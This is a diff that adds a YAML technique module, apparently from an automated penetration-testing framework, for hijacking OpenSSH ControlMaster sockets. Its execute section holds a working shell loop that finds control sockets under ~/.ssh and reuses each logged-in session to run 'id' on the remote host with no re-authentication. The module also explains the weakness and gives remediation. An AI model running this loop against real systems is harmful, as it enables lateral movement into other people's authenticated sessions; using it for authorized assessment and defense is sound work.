@@ -1,0 +1,40 @@
+# SSH ControlMaster session hijack — piggyback on a logged-in session
+technique: T1021.004
+name: SSH ControlPath session hijack
+key: lateral:ssh-controlpath-hijack
+tactic: [lateral-movement]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  facts_match: {has_ssh_controlpath_sockets: true}
+execute:
+  command: |-
+    for sock in $HOME/.ssh/control-*; do
+      [ -S "$sock" ] || continue
+      # The socket's basename encodes user@host:port — pull the target
+      # and reuse the multiplex session without re-auth.
+      name=$(basename "$sock" | sed 's/^control-//')
+      echo "HIJACK-TARGET: $name  (socket=$sock)"
+      ssh -o ControlPath="$sock" "$name" id 2>/dev/null
+    done
+verify:
+  success: "uid="
+cleanup:
+  command: ""
+report:
+  vector_type: ssh_controlpath_hijack
+  evidence: "active SSH ControlMaster multiplex socket under ~/.ssh/"
+  description: >
+    OpenSSH's ``ControlMaster`` feature reuses an authenticated session
+    across multiple ``ssh`` invocations. Any process with read access
+    to the control socket piggybacks on the authenticated session
+    WITHOUT re-authenticating — no password, no key prompt. On a
+    shared bastion / jump host this hijacks a logged-in admin's session.
+  remediation: >
+    Set ``ControlPath=~/.ssh/control-%r@%h:%p`` under 0700 ``.ssh/``,
+    or disable ControlMaster entirely on bastions. Audit any shared
+    account whose ``.ssh/`` directory is group-readable.
+  refs: [T1021.004]
